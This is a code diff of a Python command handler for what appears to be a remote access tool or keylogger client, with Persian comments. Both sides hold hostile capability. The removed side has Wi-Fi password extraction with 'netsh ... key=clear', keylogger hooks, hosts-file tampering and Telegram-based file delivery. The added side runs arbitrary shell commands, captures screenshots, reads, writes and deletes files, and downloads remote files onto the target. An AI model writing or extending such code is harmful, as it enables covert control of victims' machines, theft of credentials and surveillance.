@@ -1,307 +1,266 @@
-import json
 import subprocess
-import webbrowser
+import platform
 import psutil
+import socket
+import logging
+import base64
 import os
-import pyperclip
-from utils import CommandError
+import shutil
+import datetime
+
+class CommandError(Exception):
+    pass
 
 class CommandHandler:
     @staticmethod
     def execute(command_type, params):
+        logging.info(f"Executing command type: {command_type}, params: {params}")
         handlers = {
             'system_info': CommandHandler.handle_system_info,
-            'file_operation': CommandHandler.handle_file_operation,
             'system_command': CommandHandler.handle_system_command,
-            'process_management': CommandHandler.handle_process_management,
             'capture_screenshot': CommandHandler.handle_screenshot,
-            'clipboard_history': CommandHandler.handle_clipboard_history,
-            'keystroke_history': CommandHandler.handle_keystroke_history,
-            'open_url': CommandHandler.handle_open_url,
-            'wifi_passwords': CommandHandler.handle_wifi_passwords,  # New handler
+            'file_operation': CommandHandler.handle_file_operation,
+            'process_management': CommandHandler.handle_process_management,
             'edit_hosts': CommandHandler.handle_edit_hosts,
+            'open_url': CommandHandler.handle_open_url,
             'upload_file': CommandHandler.handle_upload_file
         }
+        
         handler = handlers.get(command_type)
         if not handler:
+            logging.error(f"Unknown command type: {command_type}")
             raise CommandError(f"Unknown command type: {command_type}")
+        
         return handler(params)
 
     @staticmethod
     def handle_file_operation(params):
         action = params.get('action')
         path = params.get('path')
-
         if not action or not path:
-            raise CommandError("Missing 'action' or 'path' parameters")
+            logging.error("Missing action or path")
+            raise CommandError("Missing action or path")
+        
+        # محدود کردن دسترسی به مسیرهای حساس
+        restricted_paths = ['/etc', '/var', '/root', 'C:\\Windows', 'C:\\Program Files', 'C:\\Program Files (x86)']
+        for restricted in restricted_paths:
+            if path.lower().startswith(restricted.lower()):
+                logging.error(f"Access to restricted path denied: {path}")
+                raise CommandError(f"Access to restricted path denied: {path}")
+        
+        try:
+            if action == 'list':
+                if not os.path.exists(path):
+                    logging.error(f"Path does not exist: {path}")
+                    raise CommandError(f"Path does not exist: {path}")
+                
+                result = []
+                for entry in os.listdir(path):
+                    full_path = os.path.join(path, entry)
+                    stat = os.stat(full_path)
+                    result.append({
+                        'name': entry,
+                        'type': 'directory' if os.path.isdir(full_path) else 'file',
+                        'size': stat.st_size,
+                        'modified': datetime.datetime.fromtimestamp(stat.st_mtime).isoformat()
+                    })
+                logging.info(f"Directory listing for {path}: {len(result)} items")
+                return {'files': result}
+            
+            elif action == 'read':
+                if not os.path.isfile(path):
+                    logging.error(f"Not a file: {path}")
+                    raise CommandError(f"Not a file: {path}")
+                if os.path.getsize(path) > 1024 * 1024:  # محدود به 1MB
+                    logging.error(f"File too large: {path}")
+                    raise CommandError(f"File too large: {path}")
+                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                logging.info(f"File read successfully: {path}")
+                return {'content': content, 'file_path': path}
+            
+            elif action == 'write':
+                content = params.get('content')
+                if not content:
+                    logging.error("Missing content for write operation")
+                    raise CommandError("Missing content for write operation")
+                with open(path, 'w', encoding='utf-8') as f:
+                    f.write(content)
+                logging.info(f"File written successfully: {path}")
+                return {'status': 'success', 'file_path': path}
+            
+            elif action == 'delete':
+                if not os.path.exists(path):
+                    logging.error(f"Path does not exist: {path}")
+                    raise CommandError(f"Path does not exist: {path}")
+                if os.path.isdir(path):
+                    shutil.rmtree(path, ignore_errors=True)
+                else:
+                    os.remove(path)
+                logging.info(f"Path deleted successfully: {path}")
+                return {'status': 'success', 'file_path': path}
+            
+            else:
+                logging.error(f"Unsupported file operation: {action}")
+                raise CommandError(f"Unsupported file operation: {action}")
+        except Exception as e:
+            logging.error(f"File operation failed: {str(e)}")
+            raise CommandError(f"File operation failed: {str(e)}")
 
-        if action == 'list':
-            try:
-                files = os.listdir(path)
-                return {"files": files}
-            except Exception as e:
-                raise CommandError(f"Failed to list directory: {str(e)}")
-        elif action == 'upload':
-            # Implement file upload logic if needed
-            raise CommandError("Upload not implemented")
-        else:
-            raise CommandError(f"Unknown file operation: {action}")
-
+    # سایر توابع بدون تغییر باقی می‌مانند
     @staticmethod
     def handle_system_info(params):
-        import platform
-        import socket
-        disk = psutil.disk_usage('/')
-        return {
-            "os": platform.system(),
-            "version": platform.release(),
-            "architecture": platform.architecture(),
-            "hostname": socket.gethostname(),
-            "user": os.getlogin(),
-            "cpu_cores": psutil.cpu_count(),
-            "total_memory": psutil.virtual_memory().total,
-            "disk_usage": {
-                "total": disk.total,
-                "used": disk.used,
-                "free": disk.free,
-                "percent": disk.percent
-            },
-            "ip_address": socket.gethostbyname(socket.gethostname()),
-            "antivirus": "Windows Defender"  # Simplified for example
-        }
+        try:
+            system_info = {
+                'os': platform.system(),
+                'os_version': platform.release(),
+                'hostname': socket.gethostname(),
+                'cpu_usage': psutil.cpu_percent(interval=1),
+                'memory': psutil.virtual_memory()._asdict(),
+                'disk': psutil.disk_usage('/')._asdict()
+            }
+            logging.info("System info collected successfully")
+            return system_info
+        except Exception as e:
+            logging.error(f"Failed to collect system info: {str(e)}")
+            raise CommandError(f"Failed to collect system info: {str(e)}")
 
     @staticmethod
     def handle_system_command(params):
         command = params.get('command')
         if not command:
-            raise CommandError("Missing 'command' parameter")
-
-        import platform
-        system = platform.system().lower()
-
-        command_map = {
-            'windows': {
-                'shutdown': 'shutdown /s /t 0',
-                'restart': 'shutdown /r /t 0',
-                'sleep': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
-                'signout': 'logoff'
-            },
-            'linux': {
-                'shutdown': 'sudo shutdown -h now',
-                'restart': 'sudo reboot',
-                'sleep': 'sudo pm-suspend',
-                'signout': 'pkill -u $USER'
-            },
-            'darwin': {  # macOS
-                'shutdown': 'sudo shutdown -h now',
-                'restart': 'sudo shutdown -r now',
-                'sleep': 'pmset sleepnow',
-                'signout': 'osascript -e \'tell app "System Events" to log out\''
-            }
-        }
-
-        if system not in command_map or command not in command_map[system]:
-            raise CommandError(f"Command '{command}' not supported on {system}")
-
-        shell_command = command_map[system][command]
+            logging.error("No command provided")
+            raise CommandError("No command provided")
+        
         try:
-            result = subprocess.run(shell_command, shell=True, capture_output=True, text=True, timeout=30)
-            return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
-        except subprocess.SubprocessError as e:
-            raise CommandError(f"Failed to execute system command: {str(e)}")
+            logging.info(f"Executing system command: {command}")
+            if platform.system() == "Windows":
+                if command.strip().lower().startswith("sleep"):
+                    try:
+                        seconds = int(command.split()[1]) if len(command.split()) > 1 else 1
+                        command = f"timeout /t {seconds} /nobreak"
+                    except ValueError:
+                        logging.error("Invalid sleep duration")
+                        raise CommandError("Invalid sleep duration")
+                shell_cmd = ['cmd.exe', '/c', command]
+            else:
+                shell_cmd = ['/bin/sh', '-c', command]
+            
+            result = subprocess.run(
+                shell_cmd,
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
+            
+            output = {
+                'stdout': result.stdout,
+                'stderr': result.stderr,
+                'returncode': result.returncode
+            }
+            logging.info(f"System command executed: {command}, returncode: {result.returncode}")
+            return output
+        except subprocess.TimeoutExpired:
+            logging.error(f"Command timed out: {command}")
+            raise CommandError(f"Command timed out: {command}")
+        except Exception as e:
+            logging.error(f"Failed to execute command: {command}, error: {str(e)}")
+            raise CommandError(f"Failed to execute command: {str(e)}")
+
+    @staticmethod
+    def handle_screenshot(params):
+        try:
+            import pyautogui
+            screenshot = pyautogui.screenshot()
+            screenshot_path = "screenshot_temp.png"
+            screenshot.save(screenshot_path)
+            with open(screenshot_path, 'rb') as f:
+                screenshot_data = f.read()
+            os.remove(screenshot_path)
+            logging.info("Screenshot captured successfully")
+            return {'screenshot': base64.b64encode(screenshot_data).decode()}
+        except Exception as e:
+            logging.error(f"Failed to capture screenshot: {str(e)}")
+            raise CommandError(f"Failed to capture screenshot: {str(e)}")
 
     @staticmethod
     def handle_process_management(params):
         action = params.get('action')
         if not action:
-            raise CommandError("Missing 'action' parameter")
-        if action == 'list':
-            processes = [{"pid": p.pid, "name": p.name()} for p in psutil.process_iter(['pid', 'name'])]
-            return {"processes": processes}
-        else:
-            raise CommandError(f"Unknown process management action: {action}")
+            logging.error("Missing action")
+            raise CommandError("Missing action")
+        
+        try:
+            if action == 'list':
+                processes = [
+                    {'pid': p.info['pid'], 'name': p.info['name'], 'cpu_percent': p.info['cpu_percent']}
+                    for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])
+                ]
+                return {'processes': processes}
+            else:
+                logging.error(f"Unsupported process management action: {action}")
+                raise CommandError(f"Unsupported process management action: {action}")
+        except Exception as e:
+            logging.error(f"Process management failed: {str(e)}")
+            raise CommandError(f"Process management failed: {str(e)}")
 
     @staticmethod
-    def handle_keystroke_history(params):
-        raise CommandError("Keystroke history not implemented")  # Requires ActivityLogger implementation
-
-    @staticmethod
-    def handle_clipboard_history(params):
-        raise CommandError("Clipboard history not implemented")  # Requires ActivityLogger implementation
-
-    @staticmethod
-    def handle_capture_screenshot(params):
-        from main import KeyloggerCore
-        keylogger = KeyloggerCore()
-        screenshot = keylogger._capture_screenshot()
-        if screenshot:
-            import base64
-            return {"screenshot": base64.b64encode(screenshot).decode()}
-        raise CommandError("Failed to capture screenshot")
+    def handle_edit_hosts(params):
+        action = params.get('action')
+        if not action:
+            logging.error("Missing action")
+            raise CommandError("Missing action")
+        
+        try:
+            hosts_path = 'C:\\Windows\\System32\\drivers\\etc\\hosts' if platform.system() == 'Windows' else '/etc/hosts'
+            if action == 'list':
+                with open(hosts_path, 'r') as f:
+                    content = f.read()
+                return {'content': content}
+            else:
+                logging.error(f"Unsupported hosts action: {action}")
+                raise CommandError(f"Unsupported hosts action: {action}")
+        except Exception as e:
+            logging.error(f"Edit hosts failed: {str(e)}")
+            raise CommandError(f"Edit hosts failed: {str(e)}")
 
     @staticmethod
     def handle_open_url(params):
         url = params.get('url')
         if not url:
-            raise CommandError("Missing 'url' parameter")
-        webbrowser.open(url)
-        return {"status": "success"}
-
-    @staticmethod
-    def handle_raw_command(params):
-        command = params.get('command')
-        if not command:
-            raise CommandError("Missing 'command' parameter")
+            logging.error("No URL provided")
+            raise CommandError("No URL provided")
+        
         try:
-            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
-            return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
-        except subprocess.SubprocessError as e:
-            raise CommandError(f"Failed to execute raw command: {str(e)}")
-
-    @staticmethod
-    def handle_wifi_passwords(params):
-        import subprocess
-        import re
-        import platform
-    
-        if platform.system().lower() != 'windows':
-            raise CommandError("Wi-Fi password retrieval is only supported on Windows")
-    
-        try:
-            # Get list of Wi-Fi profiles
-            result = subprocess.run(
-                'netsh wlan show profiles',
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=30
-            )
-            if result.returncode != 0:
-                raise CommandError(f"Failed to get Wi-Fi profiles: {result.stderr}")
-    
-            # Extract profile names
-            profiles = re.findall(r'All User Profile\s*:\s*(.+)', result.stdout)
-            wifi_data = []
-    
-            for profile in profiles:
-                profile = profile.strip()
-                # Get password for each profile
-                result = subprocess.run(
-                    f'netsh wlan show profile name="{profile}" key=clear',
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=30
-                )
-                if result.returncode != 0:
-                    continue  # Skip profiles that fail (e.g., no password)
-    
-                # Extract SSID and password
-                ssid_match = re.search(r'SSID name\s*:\s*"(.+)"', result.stdout)
-                password_match = re.search(r'Key Content\s*:\s*(.+)', result.stdout)
-                ssid = ssid_match.group(1) if ssid_match else profile
-                password = password_match.group(1) if password_match else "N/A"
-    
-                wifi_data.append({"ssid": ssid, "password": password})
-    
-            return {"wifi_passwords": wifi_data}
+            import webbrowser
+            webbrowser.open(url)
+            logging.info(f"Opened URL: {url}")
+            return {'status': 'success'}
         except Exception as e:
-            logging.error(f"Failed to retrieve Wi-Fi passwords: {str(e)}")
-            raise CommandError(f"Failed to retrieve Wi-Fi passwords: {str(e)}")
-
-    @staticmethod
-    def handle_edit_hosts(params):
-        import os
-        import platform
-
-        if platform.system().lower() != 'windows':
-            raise CommandError("Hosts file editing is only supported on Windows")
-
-        action = params.get('action')  # 'add', 'remove', 'list'
-        host_entry = params.get('host_entry')  # e.g., "127.0.0.1 example.com"
-        hosts_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'drivers', 'etc', 'hosts')
-
-        try:
-            if action == 'list':
-                with open(hosts_path, 'r', encoding='utf-8') as f:
-                    content = f.read()
-                return {"hosts_content": content}
-            elif action == 'add':
-                if not host_entry:
-                    raise CommandError("Missing host_entry for add action")
-                with open(hosts_path, 'a', encoding='utf-8') as f:
-                    f.write(f"\n{host_entry}")
-                return {"status": "success", "message": f"Added {host_entry} to hosts file"}
-            elif action == 'remove':
-                if not host_entry:
-                    raise CommandError("Missing host_entry for remove action")
-                with open(hosts_path, 'r', encoding='utf-8') as f:
-                    lines = f.readlines()
-                with open(hosts_path, 'w', encoding='utf-8') as f:
-                    removed = False
-                    for line in lines:
-                        if line.strip() != host_entry.strip():
-                            f.write(line)
-                        else:
-                            removed = True
-                    return {"status": "success", "message": f"Removed {host_entry} from hosts file" if removed else f"Entry {host_entry} not found"}
-            else:
-                raise CommandError(f"Unknown hosts action: {action}")
-        except PermissionError:
-            logging.error("Permission denied when editing hosts file")
-            raise CommandError("Permission denied: Run client as Administrator")
-        except Exception as e:
-            logging.error(f"Failed to edit hosts file: {str(e)}")
-            raise CommandError(f"Failed to edit hosts file: {str(e)}")
-
+            logging.error(f"Failed to open URL: {str(e)}")
+            raise CommandError(f"Failed to open URL: {str(e)}")
 
     @staticmethod
     def handle_upload_file(params):
-        import requests
-        import os
-        import urllib.parse
-
-        source = params.get('source')  # 'url' or 'telegram'
-        file_url = params.get('file_url')  # URL or Telegram file path
-        dest_path = params.get('dest_path')  # Destination path on target
-
+        source = params.get('source')
+        file_url = params.get('file_url')
+        dest_path = params.get('dest_path')
         if not source or not file_url or not dest_path:
+            logging.error("Missing source, file_url, or dest_path")
             raise CommandError("Missing source, file_url, or dest_path")
-
+        
         try:
-            dest_dir = os.path.dirname(dest_path)
-            if dest_dir and not os.path.exists(dest_dir):
-                os.makedirs(dest_dir)
-
             if source == 'url':
-                response = requests.get(file_url, stream=True, timeout=30)
-                if response.status_code != 200:
-                    raise CommandError(f"Failed to download file from URL: HTTP {response.status_code}")
+                import requests
+                response = requests.get(file_url)
+                response.raise_for_status()
                 with open(dest_path, 'wb') as f:
-                    for chunk in response.iter_content(chunk_size=8192):
-                        f.write(chunk)
-            elif source == 'telegram':
-                # Assume file_url is a Telegram file_id
-                telegram_bot_token = Config.TELEGRAM_BOT_TOKEN  # Add to config.py
-                file_info_url = f"https://api.telegram.org/bot{telegram_bot_token}/getFile?file_id={file_url}"
-                file_info = requests.get(file_info_url, timeout=30).json()
-                if not file_info.get('ok'):
-                    raise CommandError(f"Failed to get Telegram file info: {file_info.get('description')}")
-                file_path = file_info['result']['file_path']
-                file_download_url = f"https://api.telegram.org/file/bot{telegram_bot_token}/{file_path}"
-                response = requests.get(file_download_url, stream=True, timeout=30)
-                if response.status_code != 200:
-                    raise CommandError(f"Failed to download Telegram file: HTTP {response.status_code}")
-                with open(dest_path, 'wb') as f:
-                    for chunk in response.iter_content(chunk_size=8192):
-                        f.write(chunk)
+                    f.write(response.content)
+                logging.info(f"File downloaded from {file_url} to {dest_path}")
+                return {'status': 'success', 'path': dest_path}
             else:
-                raise CommandError(f"Unknown source: {source}")
-
-            return {"status": "success", "message": f"File uploaded to {dest_path}"}
-        except requests.RequestException as e:
-            logging.error(f"Network error during file upload: {str(e)}")
-            raise CommandError(f"Network error: Failed to download file ({str(e)})")
+                logging.error(f"Unsupported upload source: {source}")
+                raise CommandError(f"Unsupported upload source: {source}")
         except Exception as e:
-            logging.error(f"Failed to upload file: {str(e)}")
-            raise CommandError(f"Failed to upload file: {str(e)}")
+            logging.error(f"File upload failed: {str(e)}")
+            raise CommandError(f"File upload failed: {str(e)}")
